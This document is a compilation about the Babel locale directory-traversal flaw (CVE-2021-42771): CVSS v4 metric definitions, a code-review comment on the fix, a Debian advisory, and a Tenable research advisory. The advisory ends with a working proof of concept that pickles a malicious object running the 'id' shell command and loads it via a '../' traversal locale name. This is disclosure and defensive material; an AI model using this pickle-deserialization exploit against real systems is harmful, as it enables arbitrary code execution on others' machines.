# CVSS v4 base metrics

##### Exploitability Metrics

Attack Vector:
This metric reflects the context by which vulnerability exploitation is possible. This metric value (and consequently the resulting severity) will be larger the more remote (logically, and physically) an attacker can be in order to exploit the vulnerable system. The assumption is that the number of potential attackers for a vulnerability that could be exploited from across a network is larger than the number of potential attackers that could exploit a vulnerability requiring physical access to a device, and therefore warrants a greater severity.

Attack Complexity:
This metric captures measurable actions that must be taken by the attacker to actively evade or circumvent existing built-in security-enhancing conditions in order to obtain a working exploit. These are conditions whose primary purpose is to increase security and/or increase exploit engineering complexity. A vulnerability exploitable without a target-specific variable has a lower complexity than a vulnerability that would require non-trivial customization. This metric is meant to capture security mechanisms utilized by the vulnerable system.

Attack Requirements:
This metric captures the prerequisite deployment and execution conditions or variables of the vulnerable system that enable the attack. These differ from security-enhancing techniques/technologies (ref Attack Complexity) as the primary purpose of these conditions is not to explicitly mitigate attacks, but rather, emerge naturally as a consequence of the deployment and execution of the vulnerable system.

Privileges Required:
This metric describes the level of privileges an attacker must possess prior to successfully exploiting the vulnerability. The method by which the attacker obtains privileged credentials prior to the attack (e.g., free trial accounts), is outside the scope of this metric. Generally, self-service provisioned accounts do not constitute a privilege requirement if the attacker can grant themselves privileges as part of the attack.

User interaction:
This metric captures the requirement for a human user, other than the attacker, to participate in the successful compromise of the vulnerable system. This metric determines whether the vulnerability can be exploited solely at the will of the attacker, or whether a separate user (or user-initiated process) must participate in some manner.
##### Vulnerable System Impact Metrics

Confidentiality:
This metric measures the impact to the confidentiality of the information managed by the VULNERABLE SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.

Integrity:
This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the VULNERABLE SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).

Availability:
This metric measures the impact to the availability of the VULNERABLE SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.
##### Subsequent System Impact Metrics

Confidentiality:
This metric measures the impact to the confidentiality of the information managed by the SUBSEQUENT SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.

Integrity:
This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the SUBSEQUENT SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).

Availability:
This metric measures the impact to the availability of the SUBSEQUENT SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.

This is kinda okay but there is a potential concern. Since certain names are reserved on windows you could cause a DOS by for instance trying to load `aux.dat` or similar files. To make this safer this should likely assert it's not in the list of reserved file names.

`basename` itself might be okay. While there are some scary inputs like `..` loading the join of dirname name `...dat` is still okay.

Sorry, something went wrong.

| [@mitsuhiko](https://github.com/mitsuhiko) Good call on the special filenames, I had forgotten those are still a thing on Windows. I added another commit that refactors the previous single call to `basename` to a function that resolves locale identifiers into full paths, taking them into account. |

Package        : python-babel
Version        : 2.3.4+dfsg.1-2+deb9u1
CVE ID         : CVE-2021-42771
Debian Bug     : 987824

Tenable discovered that in Babel, a set of tools for
internationalizing Python applications, Babel.Locale allows attackers
to load arbitrary locale .dat files (containing serialized Python
objects) via directory traversal, leading to code execution.  This
vulnerability was also previously addressed under CVE-2021-20095 in
other distributions and suites.

For Debian 9 stretch, this problem has been fixed in version
2.3.4+dfsg.1-2+deb9u1.

We recommend that you upgrade your python-babel packages.

# Python-Babel/Babel Locale Directory Traversal / Arbitrary Code Execution

Medium

[← View More Research Advisories](/security/research)
### Synopsis

Babel 2.9.0 contains a directory traversal flaw that can be exploited to load arbitrary locale .dat files, which contain serialized Python objects. If an attacker can cause Babel.Locale() to load a crafted .dat file on disk, **arbitrary code execution** can be achieved via deserialization within the context of the running process.

The path to a locale file can be specified such that a locale file is loaded from outside the locale-data directory (e.g. ../../). Essentially this would allow
for unapproved locale files to be loaded.

When the Locale() constructor is called, it will populate the language, territory, script, variant as specified.

It then checks to see if the locale's identifier exists:

core.py:
```

 166         identifier = str(self)
 167         if not localedata.exists(identifier):
 168             raise UnknownLocaleError(identifier)

```

identifier is ultimately populated via the return value of get\_locale\_identifer():

core.py:
```

 357     def __str__(self):
 358         return get_locale_identifier((self.language, self.territory,
 359                                       self.script, self.variant))

```

So if we pass 'en' as the language, the identifier ends up being 'en' as well, as can be demonstrated by calling \_\_str\_\_():

```

>>> locale = babel.Locale('en')
>>> str(locale)
'en'

```

As shown above, the localedata.exists() method is called to ensure that the locale exists:

core.py:
```

 167         if not localedata.exists(identifier):

```

If the name is not in the cache, it'll check to see if "{name}.dat" exists in \_dirname, where \_dirname equals:

localedata.py:
```

24 _dirname = os.path.join(os.path.dirname(__file__), 'locale-data')

```

This ends up being in the site-packages directory:

```

>>> print(babel.localedata._dirname)
/home/ubuntu/.local/lib/python3.8/site-packages/babel/locale-data

```

Now we get to issue. A file system path containing leading '../../' can be used to load .dat files outside the intended locale-data directory.

```

>>> locale = babel.Locale("../../../../../../../../no_exist")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/ubuntu/.local/lib/python3.8/site-packages/babel/core.py", line 168, in __init__
    raise UnknownLocaleError(identifier)
babel.core.UnknownLocaleError: unknown locale '../../../../../../../../no_exist'

```

In the above case, there is no .dat file at the root of the file system. However, if we copy the es.dat file to /tmp/en.dat...

```

$ cp ~/.local/lib/python3.8/site-packages/babel/locale-data/es.dat /tmp/en.dat

```
```

>>> locale = babel.Locale("../../../../../../../../../../tmp/en")
>>> locale.territories['US']
'Estados Unidos'

```

You can see that the /tmp/en.dat file was indeed loaded, with a Spanish translation for United States.

As we've seen above, **arbitrary Locale files can be loaded from the file system.** Let's go a bit deeper.

When a property of a Locale object is accessed, the Locale .dat file is ultimately deserialized using the pickle.load() method. If an attacker were to
craft a malicious .dat file using the Python pickle module and cause it to be loaded, arbitrary code execution can be achieved.

To elaborate, when a property of a Locale object is accessed... For example:

```

>>> locale.territories['US']

```

The localedata.load() method is called with the locale identifier as an argument.

core.py:
```

 361     @property
 362     def _data(self):
 363         if self.__data is None:
 364             self.__data = localedata.LocaleDataDict(localedata.load(str(self)))
 365         return self.__data

```

Ultimately, this leads to the **deserialization of the specified locale** in the localedata.load() method.
localedata.py:

```

122             filename = os.path.join(_dirname, '%s.dat' % name)
123             with open(filename, 'rb') as fileobj:
124                 if name != 'root' and merge_inherited:
125                     merge(data, pickle.load(fileobj))
126                 else:
127                     data = pickle.load(fileobj)

```
### Proof of Concept

To demonstrate an arbitrary code execution scenario, run the following Python code. The code will first create a malicious .dat file by pickling
a class object. When the object is deserialized by Babel, it will run the UNIX 'id' shell command. **Notice in the output that the result of the id command
is displayed.**

babel\_id\_exploit.py:
```

import pickle
import subprocess
import babel

class RunCommand(object):
    def __reduce__(self):
        return (subprocess.call, (('id',),))

# write .dat extension for babel
with open("/tmp/evil.dat", "wb") as output_file:
    pickle.dump(RunCommand(), output_file)
    output_file.close()

print("Created /tmp/evil.dat")

# similar usage of Locale constructor as seen at http://babel.pocoo.org/en/latest/locale.html#the-locale-class
language = '../../../../../../../../../../tmp/evil'
locale = babel.Locale(language)

print ("Loaded Locale with language '" + language + "'")

locale.territories['US']

print ("Accessed territories")

```
Output:
```

$ python3 babel_id_exploit.py
Created /tmp/evil.dat
Loaded Locale with language '../../../../../../../../../../tmp/evil'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
Traceback (most recent call last):
  File "babel_id_exploit.py", line 22, in <module>
    locale.territories['US']
  File "/home/ubuntu/.local/lib/python3.8/site-packages/babel/core.py", line 506, in territories
    return self._data['territories']
  File "/home/ubuntu/.local/lib/python3.8/site-packages/babel/core.py", line 364, in _data
    self.__data = localedata.LocaleDataDict(localedata.load(str(self)))
  File "/home/ubuntu/.local/lib/python3.8/site-packages/babel/localedata.py", line 125, in load
    merge(data, pickle.load(fileobj))
  File "/home/ubuntu/.local/lib/python3.8/site-packages/babel/localedata.py", line 146, in merge
    for key, val2 in dict2.items():
AttributeError: 'int' object has no attribute 'items'

```
